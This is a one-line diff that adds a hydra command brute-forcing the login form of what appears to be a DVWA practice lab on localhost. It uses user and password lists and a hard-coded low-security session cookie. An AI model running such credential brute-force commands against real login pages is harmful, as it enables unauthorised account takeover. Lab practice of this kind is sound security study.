@@ -1,0 +1,2 @@
+sudo hydra -L users -P password "http-get-form://localhost:8880/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=low;PHPSESSID=7bgqgeeea1q76admh8m0s0kov5:F=incorrect"
+
